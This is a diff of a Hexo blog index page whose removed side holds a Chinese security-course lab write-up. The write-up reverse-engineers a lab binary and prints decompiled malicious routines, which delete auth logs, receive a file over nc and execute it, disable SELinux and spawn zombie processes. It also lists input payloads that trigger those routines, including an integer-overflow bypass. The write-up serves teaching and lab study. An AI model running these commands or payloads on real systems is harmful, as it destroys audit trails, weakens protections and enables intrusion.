@@ -1,814 +1,623 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-  
-<link rel="stylesheet" href="/css/style.css">
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
+<link rel="canonical" href="http://example.com/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hexo</title>
   
-  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
 <!-- hexo injector head_end start -->
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+<!-- hexo injector head_end end --></head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hexo</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
         
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
       </div>
     </div>
-  </div>
-</header>
 
-      <div class="outer">
-        <section id="main">
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
   
-    <article id="post-信息与网络安全课程设计" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/02/21/%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/" class="article-date">
-  <time class="dt-published" datetime="2025-02-21T00:47:19.000Z" itemprop="datePublished">2025-02-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/02/21/%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/">信息与网络安全课程设计</a>
-    </h1>
   
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/21/index/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/21/index/" class="post-title-link" itemprop="url">home</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
       
-        <h1 id="软件安全课程设计"><a href="#软件安全课程设计" class="headerlink" title="软件安全课程设计"></a>软件安全课程设计</h1><p><strong>任务资料</strong><br><a href="download%5C%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%5Cpcap-sample.zip">pcap-sample.zip</a><br><a href="%5Cdownload%5C%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%5C%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%8C%87%E5%AF%BC%E6%89%8B%E5%86%8C-2025v3">网络与系统安全课程设计指导手册-2025v3</a></p>
-<h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><h3 id="依赖安装"><a href="#依赖安装" class="headerlink" title="依赖安装"></a>依赖安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 依赖安装</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install libpcap-dev</span><br></pre></td></tr></table></figure>
-<p><strong>下面的代码只实现了基本的功能</strong><br><a href="%5Cdownload%5C%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%5Ctask1_version0.zip">task1_version0.zip</a><br>这段代码只实现了从pcap-sample.c增加代码实现顺序包重组的功能，如果需要进一步实现扩展功能，则需要读者自行实现。</p>
-<h2 id="TASK2"><a href="#TASK2" class="headerlink" title="TASK2"></a>TASK2</h2><p><strong>任务资源</strong><br><a href="%5Cdownload%5C%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%5Cdemo.c">demo.c</a></p>
-<p>在调试过程中  可以使用下列命令允许端口复用从而便于调试避免<strong>bind failed: Address already in use</strong>，下次重启失效。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> sysctl -w net.ipv4.tcp_tw_reuse=1</span><br></pre></td></tr></table></figure>
-<h3 id="QEMU安装"><a href="#QEMU安装" class="headerlink" title="QEMU安装"></a>QEMU安装</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/from-zero/p/12290170.html">QEMU安装</a><br><a target="_blank" rel="noopener" href="https://wiki.qemu.org/Hosts/Linux">编译文档</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 依赖安装</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev ninja-build</span><br><span class="line"><span class="built_in">sudo</span> apt-get install git-email</span><br><span class="line"><span class="built_in">sudo</span> apt-get install libaio-dev libbluetooth-dev libcapstone-dev libbrlapi-dev libbz2-dev</span><br><span class="line"><span class="built_in">sudo</span> apt-get install libcap-ng-dev libcurl4-gnutls-dev libgtk-3-dev</span><br><span class="line"><span class="built_in">sudo</span> apt-get install libibverbs-dev libjpeg8-dev libncurses5-dev libnuma-dev</span><br><span class="line"><span class="built_in">sudo</span> apt-get install librbd-dev librdmacm-dev</span><br><span class="line"><span class="built_in">sudo</span> apt-get install libsasl2-dev libsdl2-dev libseccomp-dev libsnappy-dev libssh-dev</span><br><span class="line"><span class="built_in">sudo</span> apt-get install libvde-dev libvdeplug-dev libvte-2.91-dev libxen-dev liblzo2-dev</span><br><span class="line"><span class="built_in">sudo</span> apt-get install valgrind xfslibs-dev</span><br><span class="line"><span class="built_in">sudo</span> apt-get install libnfs-dev libiscsi-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># QEMU安装</span></span><br><span class="line">wget https://download.qemu.org/qemu-9.0.1.tar.xz</span><br><span class="line">tar xvJf qemu-9.0.1.tar.xz</span><br><span class="line"><span class="built_in">cd</span> qemu-9.0.1</span><br><span class="line">./configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
-<p>或者直接安装</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"><span class="built_in">sudo</span> apt-get install qemu</span><br></pre></td></tr></table></figure>
 
-<h3 id="模拟运行"><a href="#模拟运行" class="headerlink" title="模拟运行"></a>模拟运行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector demo.c -o demo </span><br></pre></td></tr></table></figure>
-<p>发现错误<br><img src="/2025/02/21/%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/image.png"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装32位依赖</span></span><br><span class="line"><span class="built_in">sudo</span> dpkg --add-architecture i386</span><br><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"><span class="built_in">sudo</span> apt-get install gcc-multilib libc6-dev-i386</span><br></pre></td></tr></table></figure>
-<p>模拟运行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-i386 -strace -d in_asm -D trace.log demo</span><br><span class="line"></span><br><span class="line">qemu-i386 -strace -d in_asm -D trace.log cs-test</span><br><span class="line"><span class="comment">#单开另外一个终端输入下面的命令</span></span><br><span class="line">telnet 127.0.0.1 12345</span><br><span class="line"><span class="comment"># 输入1AB  实验恶意代码执行的部分</span></span><br><span class="line"><span class="comment"># 输入12345678X 实验缓冲区溢出部分</span></span><br></pre></td></tr></table></figure>
-<p>对于demo的标准解题答案<br><a href="%5Cdownload%5C%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%5Cdemo%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%A0%87%E5%87%86%E7%AD%94%E6%A1%88.pdf">demo程序的标准答案</a></p>
-<h3 id="cs-test逆向分析"><a href="#cs-test逆向分析" class="headerlink" title="cs-test逆向分析"></a>cs-test逆向分析</h3><p>根据已知条件，我们知道cs-test和demo.c的源码及其相似。之后我们查看cs-test被IDA反汇编的源码<br><img src="/2025/02/21/%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/image-1.png"><br>我们需要满足contains_you_are_the_best函数的条件才可以执行内部的恶意代码<br>进入contains_you_are_the_best函数<br><img src="/2025/02/21/%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/image-2.png"><br>发现函数的逻辑是找youarethebest的子串。只要我们输入的字符串中有这个子串，即可通过这个条件<br>现在执行恶意功能<br>执行顺序为Mal_func3–&gt;Mal_func4</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> Mal_func1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Deleting system logs...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> remove(<span class="string">&quot;/var/log/auth.log&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Mal_func2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( sub_5DD41290(<span class="string">&quot;/home/cs-test/Test/hustlogo.png&quot;</span>, <span class="string">&quot;system.sh&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> sub_5DD41220(<span class="string">&quot;rename failed&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( sub_5DD41330(<span class="string">&quot;system.sh&quot;</span>, <span class="number">511</span>) )</span><br><span class="line">    <span class="keyword">return</span> sub_5DD41220(<span class="string">&quot;chmod failed&quot;</span>);</span><br><span class="line">  sub_5DD41260(<span class="string">&quot;[+] Changing file permission...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( sub_5DD41270(<span class="string">&quot;./system.sh&quot;</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_5DD41220(<span class="string">&quot;system failed&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> sub_5DD41260(<span class="string">&quot;Script executed successfully.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">- Mal_func3</span><br><span class="line"><span class="type">int</span> <span class="title function_">Mal_func3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_5DD411F0(<span class="string">&quot;Executing command: %s\n&quot;</span>, <span class="string">&quot;nc -l -p 54321 &gt; hustlogo.png&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( sub_5DD41270(<span class="string">&quot;nc -l -p 54321 &gt; hustlogo.png&quot;</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_5DD41220(<span class="string">&quot;system failed&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> sub_5DD41260(<span class="string">&quot;Command executed successfully.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">- Mal_func4</span><br><span class="line"><span class="type">int</span> <span class="title function_">Mal_func4</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  result = sub_5DD41260(<span class="string">&quot;[+] Creating zombie processes...&quot;</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = sub_5DD412E0();</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;</span><br><span class="line">      v1 = sub_5DD41240();</span><br><span class="line">      sub_5DD411F0(<span class="string">&quot;I am child, my pid = %d\n&quot;</span>, v1);</span><br><span class="line">      result = sub_5DD41280((<span class="type">int</span>)&amp;GLOBAL_OFFSET_TABLE_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Mal_func5</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_5DD41260(<span class="string">&quot;[+] Disabling SELinux...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_5DD41270(<span class="string">&quot;setenforce 0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">Vul_func12</span><span class="params">(<span class="type">int</span> dest_raw)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">24</span>]; <span class="comment">// [esp+Ch] [ebp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="type">char</span> *)(dest_raw + <span class="number">50</span>) + *(<span class="type">char</span> *)(dest_raw + <span class="number">70</span>) &lt;= <span class="number">19</span> )</span><br><span class="line">    <span class="built_in">strncpy</span>(dest, (<span class="type">const</span> <span class="type">char</span> *)(dest_raw + <span class="number">20</span>), *(<span class="type">char</span> *)(dest_raw + <span class="number">50</span>) + *(<span class="type">char</span> *)(dest_raw + <span class="number">70</span>));</span><br><span class="line">  <span class="keyword">if</span> ( dest[<span class="number">23</span>] == <span class="string">&#x27;%&#x27;</span> )</span><br><span class="line">    Vul_func345((<span class="type">int</span>)dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>其中mal_func 1-5的payload为</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">&quot;1AByouarethebest&quot;</span>     <span class="comment">#</span></span><br><span class="line">payload2=<span class="string">&quot;128youarethebest&quot;</span>     <span class="comment">#</span></span><br><span class="line">payload3=<span class="string">&quot;a&quot;</span>*<span class="number">65</span>+<span class="string">&quot;X&quot;</span>+<span class="string">&quot;youarethebest&quot;</span>     <span class="comment"># aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaXyouarethebest</span></span><br><span class="line">payload4=<span class="string">&quot;a&quot;</span>*<span class="number">43</span>+<span class="string">&quot;Y&quot;</span>+<span class="string">&quot;youarethebest&quot;</span>     <span class="comment"># aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaYyouarethebest</span></span><br><span class="line">payload5=<span class="string">&quot;a&quot;</span>*<span class="number">35</span>+<span class="string">&quot;7&quot;</span>+(<span class="number">52</span>-<span class="number">36</span>)*<span class="string">&quot;a&quot;</span>+<span class="string">&#x27;7&#x27;</span>+<span class="string">&quot;youarethebest&quot;</span> <span class="comment"># aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa7aaaaaaaaaaaaaaaa7youarethebest</span></span><br></pre></td></tr></table></figure>
+      <time title="Created: 2025-02-21 17:11:03 / Modified: 17:19:11" itemprop="dateCreated datePublished" datetime="2025-02-21T17:11:03+08:00">2025-02-21</time>
+    </span>
 
-<p>难点在于Vul_func12的溢出<br>目标显然是进入Vul_func345函数</p>
-<p>我们希望绕过这个判断语句if ( *(char *)(dest_raw + 50) + *(char *)(dest_raw + 70) &lt;&#x3D; 19 )<br><strong>查看汇编源码发现</strong><br><img src="/2025/02/21/%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/image-3.png"><br>参与比较的dl参与了有符号扩展的movsx, 所以可以利用整数溢出漏洞来绕过这个判断语句, 从而向dest 填充目标字符串。<br>所以可以先构建payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;a&quot;</span>*<span class="number">50</span>+<span class="string">&#x27;\xff&#x27;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">19</span>+<span class="string">&quot;\xff&quot;</span>+<span class="string">&quot;youarethebest&quot;</span></span><br></pre></td></tr></table></figure>
-<p>来绕过这个判断语句<br>然后因为是从第20个字符开始复制的, 所以我们需要构建payload来填充前20个字符, 并且要保证dest[23] &#x3D;&#x3D; ‘%’来进入Vul_func345函数<br>所以更改后的的payload是:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;a&quot;</span>*<span class="number">20</span>+<span class="string">&quot;a&quot;</span>*<span class="number">23</span>+<span class="string">&quot;%&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">6</span>+<span class="string">&#x27;\xff&#x27;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">19</span>+<span class="string">&quot;\xff&quot;</span>+<span class="string">&quot;youarethebest&quot;</span></span><br></pre></td></tr></table></figure>
-<p>这样构造的payload的利用了整数溢出漏洞使系统崩溃，虚拟机会出现段错误,询问老师发现是给我们测试的cs-test版本不对,无法进入vul345</p>
-<p>更新后的vul345的代码为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl Vul_func12(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  char dest[24]; // [esp+Ch] [ebp-1Ch] BYREF</span><br><span class="line"></span><br><span class="line">  if ( *(char *)(a1 + 50) + *(char *)(a1 + 70) &lt;= 19 )</span><br><span class="line">    strncpy(dest, (const char *)(a1 + 20), *(char *)(a1 + 50) + *(char *)(a1 + 70));</span><br><span class="line">  result = *(unsigned __int8 *)(a1 + 23);</span><br><span class="line">  if ( (_BYTE)result == &#x27;%&#x27; )</span><br><span class="line">    return Vul_func345(dest);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>此时触发Vul_func12中整数溢出漏洞的payload为</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload6_int_overflow = <span class="string">&quot;a&quot;</span>*<span class="number">50</span>+<span class="string">&#x27;\xff&#x27;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">19</span>+<span class="string">&quot;\xff&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">7</span>+<span class="string">&quot;b&quot;</span>+<span class="string">&quot;a&quot;</span>+<span class="string">&quot;youarethebest&quot;</span>  <span class="comment"># payload6整数溢出漏洞</span></span><br></pre></td></tr></table></figure>
-<p>此时触发Vul_func345函数的条件是dest[23] &#x3D;&#x3D; ‘%’</p>
